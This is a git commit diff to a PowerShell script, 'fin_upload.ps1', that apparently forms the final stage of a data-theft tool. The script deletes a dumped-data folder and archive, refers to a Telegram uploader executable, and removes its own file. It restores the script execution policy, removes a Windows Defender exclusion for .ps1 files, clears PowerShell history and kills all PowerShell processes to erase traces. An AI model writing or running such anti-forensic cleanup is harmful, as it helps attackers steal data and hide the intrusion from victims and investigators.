0d71065a557293075b615220df02f58dc1c6a352
tuconnaisyouknow <yenghele@fayou.cloud>
2023-10-10 12:14:25 +0200

    Correcting some bugs

--- upload/fin_upload.ps1
+++ upload/fin_upload.ps1
@@ -9,8 +9,8 @@ Set-Location C:\Users\Public\Documents #Go to public documents location
 #Delete all files downloaded before
 Remove-Item -r dump/
 Remove-Item dump.zip
-Remove-Item telegram_uploader.exe
 Remove-Item fin_upload.ps1
 Set-ExecutionPolicy restricted -Force #Reset script blocker
+Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
 Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
 taskkill -F /IM powershell.exe #Kill all powershell process
